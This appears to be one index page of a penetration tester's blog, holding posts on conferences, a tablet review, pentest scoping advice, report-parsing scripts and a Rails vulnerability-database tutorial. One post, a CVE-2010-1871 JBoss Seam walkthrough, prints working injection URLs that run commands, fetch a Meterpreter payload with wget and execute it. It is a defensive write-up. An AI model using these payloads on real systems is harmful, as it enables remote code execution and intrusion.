<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<title>Raesene's Ramblings</title>
	
	<meta name="author" content="raesene">

	<!-- Enable responsive viewport -->
	<meta name="viewport" content="width=device-width, initial-scale=1.0">

	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
	<!--[if lt IE 9]>
	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
	<![endif]-->

	<!-- Le styles -->
	<link href="https://raesene.github.io/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
	<link href="https://raesene.github.io/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
	<link href="https://raesene.github.io/assets/resources/syntax/syntax.css" rel="stylesheet">
	<link href="https://raesene.github.io/assets/css/style.css" rel="stylesheet">

	<!-- Le fav and touch icons -->
	<!-- Update these with your own images
	<link rel="shortcut icon" href="images/favicon.ico">
	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
	-->

	<link rel="alternate" type="application/rss+xml" title="" href="https://raesene.github.io/feed.xml">
</head>

<body>
	<nav class="navbar navbar-default visible-xs" role="navigation">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
				<span class="sr-only">Toggle navigation</span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
				<span class="icon-bar"></span>
			</button>
			
			<a type="button" class="navbar-toggle nav-link" href="https://github.com/raesene">
				<i class="fa fa-github"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="https://twitter.com/raesene">
				<i class="fa fa-twitter"></i>
			</a>
			
			
			<a type="button" class="navbar-toggle nav-link" href="mailto:raesene@gmail.com">
				<i class="fa fa-envelope"></i>
			</a>
			
			<a class="navbar-brand" href="https://raesene.github.io/">
				<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=35" class="img-circle" />
				Raesene's Ramblings
			</a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
			<ul class="nav navbar-nav">
				<li class="active"><a href="https://raesene.github.io/">Home</a></li>
				<li><a href="https://raesene.github.io/categories/index.html">Categories</a></li>
				<li><a href="https://raesene.github.io/tags/index.html">Tags</a></li>
			</ul>
		</div><!-- /.navbar-collapse -->
	</nav>

	<!-- nav-menu-dropdown -->
	<div class="btn-group hidden-xs" id="nav-menu">
		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
			<i class="fa fa-bars"></i>
		</button>
		<ul class="dropdown-menu" role="menu">
			<li><a href="https://raesene.github.io/"><i class="fa fa-home"></i>Home</a></li>
			<li><a href="https://raesene.github.io/categories/index.html"><i class="fa fa-folder"></i>Categories</a></li>
			<li><a href="https://raesene.github.io/tags/index.html"><i class="fa fa-tags"></i>Tags</a></li>
			<li class="divider"></li>
			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
		</ul>
	</div>

	<div class="col-sm-3 sidebar hidden-xs">
		<!-- sidebar.html -->
<header class="sidebar-header" role="banner">
	<a href="https://raesene.github.io/">
		<img src="https://www.gravatar.com/avatar/8c189c784a607c4b5d52b0c7ee69b036?s=150" class="img-circle" />
	</a>
	<h3 class="title">
        <a href="https://raesene.github.io/">Raesene's Ramblings</a>
    </h3>
</header>


<div id="bio" class="text-center">
	Security Geek, Kubernetes, Docker, Ruby, Hillwalking
</div>


<div id="contact-list" class="text-center">
	<ul class="list-unstyled list-inline">
		
		<li>
			<a class="btn btn-default btn-sm" href="https://github.com/raesene">
				<i class="fa fa-github-alt fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://twitter.com/raesene">
				<i class="fa fa-twitter fa-lg"></i>
			</a>
		</li>
		
		
		<li>
			<a class="btn btn-default btn-sm" href="mailto:raesene@gmail.com">
				<i class="fa fa-envelope fa-lg"></i>
			</a>
		</li>
		
	</ul>
	<ul id="contact-list-secondary" class="list-unstyled list-inline">
		
		
		<li>
			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/rorym">
				<i class="fa fa-linkedin fa-lg"></i>
			</a>
		</li>
		
		<li>
			<a class="btn btn-default btn-sm" href="https://raesene.github.io/feed.xml">
				<i class="fa fa-rss fa-lg"></i>
			</a>
		</li>
	</ul>
</div>
<!-- sidebar.html end -->

	</div>

	<div class="col-sm-9 col-sm-offset-3">
		<div class="page-header">
  <h1>Raesene's Ramblings </h1>
</div>



<article class="home">

  <span class="post-date">
    
    January
    17th,
    
    2013
  </span>

  <h2>
    <a href="https://raesene.github.io/blog/2013/01/17/securi-tay2-conference/">Securi-Tay2 Conference</a>
  </h2>

  <div>
    
    
    <p>We both attended the Securitay2 Conference in Dundee yesterday.  This was organized by the students from the Ethical Hacking course at Abertay University - and it turned out to be really good.  I've been to a number of professional conferences such as 44Con and BruCon - and I thought the home-brewed Scottish version was just as good and considerably less expensive (£10 for a ticket).  Really good selection of talks (Ian Ferguson's talk on encryption was my favourite) and it was nice to see the number of professional testers we had talking to the Student population who will be our next generation....  Well organized too - the Students responsible should give themselves a big pat on the back (and put their involvement on their CVs).</p>
<p>I spoke about the Windows RT Surface Device and using PowerShell on it for Pentesting, and Rory spoke about automating Pen Tests with scripts (he is really good with Ruby).  Rory is doing a separate post with his slides.</p>
<p>My talk went reasonably well (I think) apart from the fact that although I had tested it in advance, the projector in the main auditorium didn't seem to take to the Surface and I had to use my ThinkPad instead.</p>
<p>As promised - I'm attaching my presentation to this post, so you can access that <a title="Securi-Tay Presentation" href="http://blog.scotsts.com/wp-content/uploads/2013/01/securitaypresentationv21.pptx">here</a></p>
<p>&nbsp;</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    March
    25th,
    
    2012
  </span>

  <h2>
    <a href="https://raesene.github.io/blog/2012/03/25/windows-8-on-the-acer-iconia-w500-tablet/">Windows 8 on the Acer Iconia W500 Tablet</a>
  </h2>

  <div>
    
    
    <p>Not really security related but I recently aquired a Windows tablet in order to try out the touch features of Windows 8.  It was quite an interesting experience getting the new OS on to it, but now I have, I'd like to compare the W500's features and performance with the iPad I have been using for a couple of years now.</p>
<p>First just a couple of things about the install.  I attached an external USB DVD drive to the tablet which used up both the available ports on the tablet.  This turned out to be a bad plan because I didn't consider at the time (obvious in retrospect as it is) that the drivers for the touch screen required the OS to be installed and there was therefore no way to enter the product key during the install.  So back to square one - I had to use a USB hub so that I could plug a keyboard in as well.  With hindsight I would have been better installing off a USB key (there are instructions on how to do this on the Internet).  Once this was done, everything went smoothly, but the touch screen didn't work properly (no right click, no auto-rotate).  After a bit of searching, I found that you have to go to the Acer site and reinstall the Windows 7 drivers for all the proprietory peripherals - after that everthing works fine.</p>
<p>So first impressions of the OS is pretty good.  The Metro Interface is very attractive and (for a beta) remarkably smooth and stable.  It is slightly jarring at first moving backwards and forwards between Metro and the legacy desktop - plus the lack of the start button is rather annoying but I've actually found I've got used to it pretty quickly.  The only significant problem I have with it now is that sometimes when the tablet is left in sleep mode for a long time with Windows Explorer open, it hangs the program when you wake the tablet up.</p>
<p>Comparing it to the iPad, first some negative features.  It weighs nearly twice as much as the iPad 3  and the battery life is not nearly as good.  After 8 hours on standby, the W500 was only on about quarter charge, whereas I can leave the iPad on standby for days without it losing any appreciable amount of charge.  The screen rotation on the W500 is good, but it doesn't have the transition affect the iPad does, so the screen goes black briefly when you rotate it.</p>
<p>Its good features (of which there are quite a lot).  It is a proper fully fledged PC with 2G RAM and a dual core processor which runs proper Windows apps (pretty smoothly on Win 8).  I wouldn't want to use the virtual keyboard to write a pentest report with a fancy template, but for short periods of time it is perfectly usable and (I think) nicer than the Apple one.  Plugged in to its docking station, you could easily work on a Word document on it, which is pretty much essential to our jobs.  It also has two USB ports and a SD card reader which are features I really miss in the iPad.  I tested installing a couple of programs on the SD card because the internal SSD is pretty small at 33G, and they run tolerably quickly.</p>
<p>So my verdict.  If you want a purely locked down tablet with a lovely smooth experience and a great battery life - I would go with the iPad.  However if you want to do a bit more and have a combined tablet/laptop that you can actually do work on - I think the W500 is a better bet.  Personally I am keeping both....</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    January
    13th,
    
    2012
  </span>

  <h2>
    <a href="https://raesene.github.io/blog/2012/01/13/getting-the-best-from-your-web-application-pentest/">Getting the best from your Web Application Pentest</a>
  </h2>

  <div>
    
    
    <p><strong>Getting the best from your Web Application Pentest</strong></p>
<p>We’ve noticed during the many penetration tests we have carried out, that a lot of companies do not always get the best value for money from the tester’s time they have paid for.  Below are some general observations from a tester’s point of view, and some hints for IT Managers and developers on what they should be asking for.</p>
<p>a)      Black box is not always the best approach.  The vast majority of tests we carry out completely blind – in other words we are not given any information about the systems we are testing (for example the platform the application runs on, the development framework used to create it etc.).  This means that we have to spend a considerable proportion of our time finding out basic details which could easily be supplied in advance.  The point is that we <strong>can</strong> find these things out, and we are time limited, whilst an attacker who is determined to get into your application may have all the time in the world.  By having a preliminary meeting with the tester and supplying some basic details about the application, you save him a lot of time which you have paid for and enable him to focus on the deeper issues rather than the superficial stuff.</p>
<p>b)      Fix what you can in advance.  We get the same sets of basic findings over and over again.  SSLv2 enabled.  HttpOnly flags not set on session cookies.  Poor password management policy etc. etc. etc.  These all take time to discover and time to report on – and that time is not being spent on finding out the serious issues which may get your application compromised. This policy may not get you a big fat report to wave at management, but it will get you a more thorough test.</p>
<p>c)       Think about what systems should be in scope.  We often get told that our scope is one application, but on starting to test we find that it is closely linked in with another application that is out of scope.  On one notable occasion the in scope ASP.NET application was reasonably secure but part of its functionality was served by an ancient looking PHP system likely had a large number of issues.  This makes no sense – so when you are scoping a test, don’t just think about the application itself, think about related applications and also the infrastructure that they rely on (DNS, AD, SMTP etc).</p>
<p>d)      Don’t test web applications in live unless you absolutely have to.  Testing in live does not always give you the best value for money, because in a lot of cases, testers have to be more careful with how they scan to avoid any adverse impact on the system.  Also, if your application has a lot of input fields, there is no way they can all be tested manually in a short time-span, so the only way to get full coverage is to run scanners, and scanners create data and (on occasion) crash servers. At least here in UK, a decent percentage of customers do not want live systems to be actually compromised, so if you want a full on Pentest rather than a risk assessment, give the tester access to a pre-prod system.</p>
<p>e)      Don’t tie your tester’s hands behind his back.  Bad guys will not throttle back their scanners because you have a flaky firewall.  They will not worry about locking your users’ accounts.  They will not refrain from creating data on your site.  They will not restrain their activities to business hours.  If you do any (or all) of these things you are not getting a full test.  So try to fix any issues you know you have in advance, and then let the tester have full access.</p>
<p>f)       Testing sites still in active development is largely pointless.  Many are the tests we have done where we are told not to test parts of it because the developers are still working on it.  For reasons that should be obvious, this is a bit of a waste of time.  Making a change to one function and accidentally bypassing input validation can introduce multiple errors in different (and sometimes unexpected) parts of the application.  Ideally the order of events should be something along the lines of Development -&gt; UAT -&gt; Redevelopment -&gt; Security Test in test environment -&gt; Redevelopment -&gt; Move to live -&gt; further Security Test.  But if time or money does not permit – at the very least wait until you have finished coding before you start testing.</p>
<p>g)      Don’t retest unless you think you have fixed the problems.  We frequently do retests where virtually none of the original issues have been fixed.  This is the ultimate exercise in futility and is a huge waste of your company’s money.  Fix the issues yourself and if you don’t know how, Google is your friend.  If you really can’t find out how to fix something – spend your money on some consultancy rather than on a pointless retest.</p>
<p>h)      If you know there is a problem you can’t fix – tell the tester.  Don’t let the tester waste huge amounts of time testing and writing up something which you know about already (for example if there is some limitation of the framework or database you are using).  Having a known security vulnerability is bad, but spending money on having someone write about it is even worse.</p>
<p>i)        Consider using part of the time you have paid for as a corrective exercise.  Following on from point g), dependent on what the issues are you might want to spend part of your time with the tester on taking advice on how to fix the problems.  Testers aren’t generally skilled developers in any particular technology, but we can normally help with configuration issues and at least point in the right direction for more development specific vulnerabilities.</p>
<p>j)        Verbose reports are not always required.  Normally on a five day test, one day is reserved for report writing (proportionally less or more for shorter or longer tests).  The reason this takes so long is that many testing companies have an elaborate report format with graphics, slides, executive summary etc.  In many cases the findings could be summarized in an email which would take half an hour to write, instead of a fifty page report which takes a whole day.  So if you don’t require a formal report, you can get more value for money out of your test by getting the tester to write it as an email summary.  You will also have a happy tester!!</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>&nbsp;</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    July
    30th,
    
    2011
  </span>

  <h2>
    <a href="https://raesene.github.io/blog/2011/07/30/from-poc-to-shell-cve-2010-1871/">From PoC to Shell - CVE-2010-1871</a>
  </h2>

  <div>
    
    
    <p>I had a chance to look at CVE-2010-1871 recently which is a vulnerability in JBoss expression language.  As it was an interesting looking vulnerability, I thought it'd be worth walking it through to the point of getting a shell on a vulnerable box, and as it took a bit of fiddling and googling on my part to get there, I figured it could be worth writing up.</p>
<p>There's a good write-up from the guy who discovered the vulnerability <a title="o0o security research" href="http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html" target="_blank">here</a> but the basics of the vulnerability is that version of the JBoss SEAM framework have an expression language which can be used to directly execute java code.  (Un)fortuntely it was possible for certain URL parameters passed by users of the application to be executed, which introduces a vulnerability.</p>
<p>In the blog post Meder goes through the process of finding the appropriate java classess and executing code using reflection, so far so good.  When I came to walk through the PoC exploit (creating a directory on the vulnerable server) the last command<br />
<code>/seam-booking/home.seam?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[19].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[7].invoke(null), 'mkdir /tmp/PWNED')}</code></p>
<p>wasn't working for me... so Google time :) (NB, the reference to seam-booking/home.seam is for the sample app used for the PoC, but this should work on any SEAM framework app)</p>
<p>Looking round to see if anyone else had any joy with this vuln. I came across a post on <a title="Stack Overflow Post" href="http://stackoverflow.com/questions/6635974/jboss-seam-interpolator-could-it-be-use-for-execute-command-java-lang-runtime-e" target="_blank">Stackoverflow</a> , where it looked like someone was getting targeted with this issue in the wild (one to take note of if you run  JBoss!).  From that it looks like the attackers had come to a slightly different means of exploiting the issue, and testing it seemed to work well.  So the basic PoC is setting the actionOutcome parameter to</p>
<p><code>actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[6].invoke(expressions.getClass().forName('java.lang.Runtime')).exec('mkdir%20/tmp/pwned')}</code></p>
<p>This has worked ok for me on Linux and windows (as target platforms).</p>
<p>Great, so now we have a basic PoC how do we move onto getting a full shell on our vulnerable system?  There's doubtless a number of ways of doing this, but here's one I hit on which seems to work pretty reliably.</p>
<p>Given that the target server is running a JBoss service, it's a reasonable assumption that it will have java installed, so we can breakout the Java Meterpreter.  First up create the payload using msfpayload.  I used bind_tcp in the lab and it's worth noting that the default metasploit port (4444) is in use, so using a different on (eg, 5556) was a good plan.</p>
<p><code>./msfpayload java/meterpreter/bind_tcp LPORT=5556 X &gt; lin.jar</code></p>
<p>Gives us our file payload, now we just need to get it deployed to the target system.  On linux, it's a fair bet that wget will be installed, so I used that to download the file from a webserver</p>
<p><code>/seam-booking/home.seam?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[6].invoke(expressions.getClass().forName('java.lang.Runtime')).exec('wget%20-O%20/tmp/lin.jar%20http://&lt;server&gt;/lin.jar')}</code></p>
<p>This places the file into /tmp, so now we just need to run it, which is pretty straightforward</p>
<p><code>/seam-booking/home.seam?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()[6].invoke(expressions.getClass().forName('java.lang.Runtime')).exec('java%20-jar%20/tmp/lin.jar')}</code></p>
<p>Having done that, it's just a question of spinning up the metasploit exploit handler and connecting to your waiting meterpreter shell.</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    July
    30th,
    
    2011
  </span>

  <h2>
    <a href="https://raesene.github.io/blog/2011/07/30/b-sides-london-videos-presentations-up/">B-Sides London Videos & Presentations Up</a>
  </h2>

  <div>
    
    
    <p>Over the last little while some of the videos from B-Sides London have been getting put up on-line, well worth a look if you get a chance.</p>
<p>The presentations are over on <a title="B-Sides London Presentations" href="http://www.slideshare.net/bsideslondon/presentations" target="_blank">slideshare</a> and the videos are on <a title="B-Sides London Videos" href="http://blip.tv/bsideslondon" target="_blank">blip.tv</a></p>
<p>The slides for my talk "Pen Testing Must Die" are <a title="Pen Testing Must Die" href="http://www.slideshare.net/bsideslondon/penetration-testing-must-die" target="_blank">here</a> and the video is <a title="Pen Testing Must Die, Video" href="http://blip.tv/bsideslondon/rory-mccune-pen-testing-must-die-5410173" target="_blank">here</a></p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    June
    1st,
    
    2011
  </span>

  <h2>
    <a href="https://raesene.github.io/blog/2011/06/01/scottish-ruby-conference-videos-up/">Scottish Ruby Conference Videos Up.</a>
  </h2>

  <div>
    
    
    <p>The videos from this years Scottish Ruby Conference are up now at <a href="http://confreaks.net/events/scotlandruby2011" target="_blank">Confreaks</a> .  As usual there's loads of good content there, but interestingly some of my favourite talks of the ones I attended were the ones that didn't directly deal with a specific aspect of ruby coding but were more general.</p>
<ul>
<li>There was <a href="http://confreaks.net/videos/568-scotlandruby2011-these-are-not-the-credit-cards-you-are-looking-for" target="_blank">this talk</a> from Ryan Stenhouse on handling Credit cards and PCI.  This was interesting to me because I'm very used to hearing the security industries perspective on PCI, but this was the take of someone actually implementing controls to meet the requirements, which is a very different perspective.</li>
<li>I enjoyed <a href="http://confreaks.net/videos/560-scotlandruby2011-the-accidental-business-owner-the-myths-of-self-employment-and-building-businesses" target="_blank">This talk</a> from from Joe O'Brien on start-ups and self employment.  I've recently been working in start-ups (and indeed this is my second now) so it was nice to get another perspective from someone who's been through that process and experienced some of the problems and pitfalls.</li>
<li>I wasn't really sure what to expect when I went to the <a href="http://confreaks.net/videos/550-scotlandruby2011-real-software-engineering" target="_blank">real software engineering</a> talk by Glen Vanderburg, but I thought it was a really good look at some fundamental problems with how software is built and how software engineering is currently taught.  Well worth a look.</li>
</ul>
<p>Of course the video for <a href="http://confreaks.net/videos/563-scotlandruby2011-practical-strategies-for-securing-your-web-application" target="_blank">my talk</a> is also up, hopefully an interesting look at some practical strategies for web application security.</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    May
    22nd,
    
    2011
  </span>

  <h2>
    <a href="https://raesene.github.io/blog/2011/05/22/welcome-to-the-scotsts-blog/">Welcome to the ScotSTS blog</a>
  </h2>

  <div>
    
    
    <p>Hello and welcome to our new blog.  We've merged in the content from Rory's old blog and spruced it up with the excellent Centita theme.</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    January
    20th,
    
    2011
  </span>

  <h2>
    <a href="https://raesene.github.io/blog/2011/01/20/just_the_facts/">Just the Facts Ma'am</a>
  </h2>

  <div>
    
    
    <p>Sometimes when you're testing it's good to be able to quickly get a feel for where to focus your attention or to get an overview of all the ports you've got open, so you can be sure you investigate all of them.  Once you've done several scans as part of a job, you end up with a stack of nmap and nessus output files, and it can be hard to keep an eye on exactly what's been found so far, and it's good to have a way to just get the facts.<br />
As a result a lot of testers will have scripts to help parse collate output from common tools like nmap.<br />
They tend not to be the prettiest code in the universe or to produce lovely management friendly reports, but handy nonetheless.<br />
Having set expectations about the quality of this code :)  Here's a couple of scripts which may come in useful for testers in managing some of those xml report files.<br />
<a href="http://www.mccune.org.uk/code/nmapautoanalyzer.rb">NMAP Auto Analyzer</a> can parse a single nmap xml file or a directory of nmap xml files and provide a concise report on ports open across them.<br />
<a href="http://www.mccune.org.uk/code/nessusautoanalyzer.rb">Nessus Auto Analyzer</a> somewhat unsurprisingly, does the same job for .nessus report files (v2 only at the moment)<br />
Both have reasonable help files, so should be fairly straightforward to use, any questions/queries welcome either in comments or in e-mail (rorym at mccune dot org dot uk)</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    October
    25th,
    
    2010
  </span>

  <h2>
    <a href="https://raesene.github.io/blog/2010/10/25/creating_a_simp_1/">Creating a Simple Vulnerability Database  - Part 2</a>
  </h2>

  <div>
    
    
    #{note_data[&#039;technical_notes&#039;]}
eos
end
</pre>
<p>This just puts together the body of the note description for each finding, as one long string.<br />
There's obviously a lot more that could be done with this (like better error handling and writing tests) but with those files complete, the module should work ok and you should be able to import vulns from your database directly into Dradis using the "import note" feature.<br />
I've put a copy of the code for the plugin up <a href="http://www.mccune.org.uk/code/simple_vulndb_import.tar.bz2">here</a>, in case it's helpful :)</p>

    
    
  </div>

</article>


<article class="home">

  <span class="post-date">
    
    October
    20th,
    
    2010
  </span>

  <h2>
    <a href="https://raesene.github.io/blog/2010/10/20/creating_a_simp/">Creating a Simple Vulnerability Database  - Part 1</a>
  </h2>

  <div>
    
    
    <p>One of the main tools that I've found useful in pen. testing is the <a href="http://www.dradisframework.org">Dradis Framework</a>, it's a good way of keeping track of findings and notes during a test and I've also found it's template feature is good for keeping a list of things to remember during a test.<br />
One of the features available in Dradis is import plugins.  This lets you create a link to an external information source, such as a OSVDB or a database of vulnerabilities.<br />
Having a database of vulnerabilities or findings can be pretty useful in cutting down the time required for reporting on a test as you can keep standard wordings in place (who really wants to write the same section about preventing XSS more than once!).<br />
So recently I knocked up a simple vulnerability database to link in to Dradis and I thought it might be of use, so here's the process.<br />
<u><strong><big>Creating the App</big></strong></u><br />
We're going to use <a href="http://rubyonrails.org/">Ruby on Rails</a> for this as it's nice and easy to develop for (as you'll see) and also that's what Dradis is based on, so makes sense to keep all the coding in the same underlying language.  Also rails apps are very portable, they're basically contained within a single directory structure, so it's relatively easy to move them from place to place.<br />
Before starting the application, there's the usual pre-req's.  I'm using Ruby 1.9.2 and Rails 3 so having those installed is a good thing.  If you're using Linux then it's helpful to have <a href="http://rvm.beginrescueend.com/">RVM</a> working as some distros don't have ruby 1.9.2 packaged up as yet.<br />
once you've got the pre-req's working, we can start by creating a rails app</p>
<pre>rails new vulnlist</pre>
<p>This creates a new application called <i>vulnlist</i> and adds all the standard rails files in.<br />
<u><strong><big>Creating the Scaffold</big></strong></u><br />
Once we've got the app created, we can use rails scaffolding to quickly create the basic structure for our app.  The web pages that scaffolding creates aren't the most pretty, but they'll do for now.<br />
With the scaffold we can specify what fields we want to create in the database and also what data types those fields are.</p>
<pre>rails generate scaffold Vulnerability title:string test_type:string description:text remediation:text technical_notes:text severity:string owasp_reference:string</pre>
<p>Once we've completed this we can look at the basic app by setting up the database with</p>
<pre>rake db:migrate</pre>
<p>Ensuring that all our gems are installed ok with</p>
<pre>bundle install</pre>
<p>and launching the app</p>
<pre>rails server</pre>
<p>At this point browsing to http://127.0.0.1:3000/vulnerabilities  should show a blank page with our fields in it.  From this page we can create new vulnerabilities and edit or delete existing ones.<br />
Now that we've got this basic structure setup it's worth using git to keep a handle on the source code.  On Linux the procedure for this is pretty easy<br />
If you've not already got it installed</p>
<pre>sudo apt-get install git-core</pre>
<p>then in the root of the application</p>
<pre>git init
git add .
git commit -m "Initial Commit with Scaffold"
</pre>
<p>Having git running on the app will make it pretty easy to revert any mistakes made along the way, as long as we've done regular commits.<br />
<u><strong><big>Setting up the Searches</big></strong></u><br />
So far we've got a basic structure in place and can do the basic Create, Read, Update, Delete cycle on our data.  However for the dradis integration, what'd be useful is if we could search for vulnerabilities using various criteria and have the results returned to Dradis.<br />
This turns out to be relatively straightforward.  First what we need is a new action in our controller.  Opening vulnlist/app/controllers/vulnerabilities_controller.rb we can see the existing actions that we've got for the application.<br />
What we need to do now is add a new action to allow for vulnerability searches.</p>
<pre>def vuln_search
case params[:search_type]
when "description"
@vulnerabilities = Vulnerability.where("description like ?", "%"+params[:query]+"%")
when "owasp"
@vulnerabilities = Vulnerability.where("owasp_reference like ?",params[:query]+"%")
when "severity"
@vulnerabilities = Vulnerability.find_all_by_severity(params[:query])
when "test_type"
@vulnerabilities = Vulnerability.find_all_by_test_type(params[:query])
end
respond_to do |format|
format.xml {render :xml =&gt; @vulnerabilities}
format.json {render :json =&gt; @vulnerabilities}
end
end
</pre>
<p>This defines a new method called "vuln_search" which takes two parameters, search_type and query.  The search type parameter lets us pick from different finders.  Rails provides access into the application database via ActiveRecord and this just uses a couple of the finder types for different parameters.  Where the query is going to be one of a number of fixed values like "severity" which will be something like high, medium or low, we can just use a standard find_all_by_ approach, but where it's a more free text style search, we use Vulnerability.where and pass in the query parameter that way.<br />
The respond_to block is a really nice feature of rails.  By adding in the two lines for :xml and :json rails wires up responses so that we can get the data out in those format, no additional code required.<br />
Now that we've got the basic code in place, we just need to modify the rails routes so that the application knows how to access our new method.<br />
This is done by modifying the vulnlist/config/routes.rb file, and adding the following code</p>
<pre>controller :vulnerabilities do
get 'vuln_search' =&gt; :vuln_search
end
</pre>
<p>At this point, we've got the application basically working.  If you put in a couple of test findings, then you should be able to go to http://127.0.0.1:3000/vuln_search.xml?search_type=Severity&amp;Query=High for example and get some XML data back.<br />
<u><strong><big>Tidying up</big></strong></u><br />
Now that we've got the basics working, there's a couple of additional steps that it's worth looking at to tidy some things up.<br />
<strong><big>Selectors</big></strong><br />
First off, we'd like some of our fields (OWASP Reference, Severity and test type) to be one of a number of defined values. The "proper" way to do this would be to create additional models for these and link them in to the main vulnerabilities controller, but there's a quicker way which is probably going to work well enough for our purposes.<br />
Opening up vulnlist/app/models/vulnerability.rb we can specify some Constant values for these settings</p>
<pre>
TEST_TYPES = ["Web Application","Windows Server","Unix Server","Wireless","Web Server","Oracle","MS SQL","MySQL","DB2"]
SEVERITY_LEVELS = ["Critical","High","Medium","Low","No Impact"]
OWASP_TOP_10 = ["A1 - Injection","A2 - Cross Site Scripting (XSS)","A3 - Broken Authentication and Session Management","A4 - Insecure Direct Object Reference","A5 - Cross-Site Request Forgery (CSRF)","A6 - Security Misconfiguration","A7 - Insecure Cryptographic Storage","A8 - Failure to Restrict URL Access","A9 - Insufficient Transport Layer Protection","A10 - Unvalidated Redirects and Forwards"]
</pre>
<p>Then we can modify the form that the scaffolding process created to use these arrays as a select list.  The form is found in vulnlist/app/views/vulnerabilities/_form.html.erb.  In that file we just need to replace the "text_field" lines for those three fields with the following select lines</p>
<pre>
 "Select the test type" %&gt;
 "Select the severity level" %&gt;
 "Select the appropriate OWASP top 10 reference" %&gt;
</pre>
<p>This picks up the Constants from our model and helps keep the data consistent.<br />
<strong><big>Localhost Only</big></strong><br />
As you'll have noticed with this application, there's pretty much no security whatsoever.  At the moment it's setup as a personal database only and isn't suitable to be on any kind of network. Adding that security isn't too difficult with rails, however it's not really a problem for the basic use case that we have here.  Both the vulnerability list and the dradis installation only need to listen on the localhost.<br />
Configuring rails to only listen on the localhost (as opposed to specifying it on the command line) is a bit hacky, but here's a way to do it based on <a href="http://www.nearinfinity.com/blogs/chris_rohr/configuring_webrick_to_use_ssl.html">this post</a> and <a href="http://dradis.svn.sourceforge.net/viewvc/dradis/server/trunk/script/rails?revision=2057&amp;view=markup">this dradis change</a> .  We need to modify the vulnlist/script/rails file and add the following lines</p>
<pre>
require 'rubygems'
require 'rails/commands/server'
require 'rack'
require 'webrick'
module Rails
class Server  3003,
:Host =&gt; "127.0.0.1",
:environment =&gt; (ENV['RAILS_ENV'] || "development").dup,
:daemonize =&gt; false,
:debugger =&gt; false,
:pid =&gt; File.expand_path("tmp/pids/server.pid"),
:config =&gt; File.expand_path("config.ru")
})
end
end
end
</pre>
<p>This also moves the application off the default port of 3000, to a new one of 3003 which hopefully shouldn't clash with other services.<br />
<big><strong>Default Routes</strong></big><br />
At the moment if we visit the root page of our application, now at http://127.0.0.1:3003 we get the default rails welcome page.  What'd be nicer is if we were re-directed to the vulnerability listing automatically.<br />
That's easily done with two steps.  First edit the vulnlist/config/routes.rb file and add the line</p>
<pre>
root :to =&gt; "vulnerabilities#index"
</pre>
<p>then delete the file vulnlist/public/index.html file.<br />
<u><strong><big>Summary</big></strong></u><br />
So at the end of this first part we've created a basic vulnerability database which we can search easily on a number of parameters.<br />
The next step is to create the dradis plugin to hook the two together, which as I'll cover next time is a reasonably easy thing to do.</p>

    
    
  </div>

</article>

<hr/>

<ul class="pager"> 

  
  <li class="previous">
    
    <a href="https://raesene.github.io/page13">&larr; Newer</a>
    
  </li>
  
  
  <li>
    <span class="page_number">Page: 14 of 57</span>
  </li>

  
  <li class="next">
    <a href="https://raesene.github.io/page15">Older &rarr;</a>
  </li>
  

</ul>




		<footer>
			<hr/>
			<p>
				&copy; 2024 raesene with Jekyll. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="https://raesene.github.io/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="https://raesene.github.io/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="https://raesene.github.io/assets/js/app.js"></script>
</body>
</html>


